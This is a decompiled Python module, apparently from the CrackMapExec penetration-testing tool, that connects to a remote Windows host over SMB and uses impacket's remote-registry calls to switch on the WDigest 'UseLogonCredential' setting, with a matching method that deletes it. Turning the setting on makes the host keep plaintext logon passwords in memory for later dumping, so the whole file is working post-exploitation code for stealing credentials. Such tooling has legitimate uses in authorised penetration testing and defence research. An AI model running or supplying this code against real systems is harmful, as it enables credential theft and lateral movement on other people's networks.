# uncompyle6 version 3.6.7
# Python bytecode 2.7 (62211)
# Decompiled from: Python 3.8.2 (tags/v3.8.2:7b3ab59, Feb 25 2020, 23:03:10) [MSC v.1916 64 bit (AMD64)]
# Embedded file name: /home/byt3bl33d3r/.virtualenvs/CME_old/lib/python2.7/site-packages/cme/credentials/wdigest.py
# Compiled at: 2016-12-29 01:49:52
from cme.remoteoperations import RemoteOperations
from impacket.dcerpc.v5.rpcrt import DCERPCException
from impacket.dcerpc.v5 import rrp

class WDIGEST:

    def __init__(self, connection):
        self.logger = connection.logger
        self.smbconnection = connection.conn
        self.doKerb = False
        self.rrp = None
        return

    def enable(self):
        remoteOps = RemoteOperations(self.smbconnection, self.doKerb)
        remoteOps.enableRegistry()
        self.rrp = remoteOps._RemoteOperations__rrp
        if self.rrp is not None:
            ans = rrp.hOpenLocalMachine(self.rrp)
            regHandle = ans['phKey']
            ans = rrp.hBaseRegOpenKey(self.rrp, regHandle, 'SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest')
            keyHandle = ans['phkResult']
            rrp.hBaseRegSetValue(self.rrp, keyHandle, 'UseLogonCredential\x00', rrp.REG_DWORD, 1)
            rtype, data = rrp.hBaseRegQueryValue(self.rrp, keyHandle, 'UseLogonCredential\x00')
            if int(data) == 1:
                self.logger.success('UseLogonCredential registry key created successfully')
        try:
            remoteOps.finish()
        except:
            pass

        return

    def disable(self):
        remoteOps = RemoteOperations(self.smbconnection, self.doKerb)
        remoteOps.enableRegistry()
        self.rrp = remoteOps._RemoteOperations__rrp
        if self.rrp is not None:
            ans = rrp.hOpenLocalMachine(self.rrp)
            regHandle = ans['phKey']
            ans = rrp.hBaseRegOpenKey(self.rrp, regHandle, 'SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest')
            keyHandle = ans['phkResult']
            try:
                rrp.hBaseRegDeleteValue(self.rrp, keyHandle, 'UseLogonCredential\x00')
            except:
                self.logger.success('UseLogonCredential registry key not present')
                try:
                    remoteOps.finish()
                except:
                    pass

                return

            try:
                rtype, data = rrp.hBaseRegQueryValue(self.rrp, keyHandle, 'UseLogonCredential\x00')
            except DCERPCException:
                self.logger.success('UseLogonCredential registry key deleted successfully')
                try:
                    remoteOps.finish()
                except:
                    pass

        return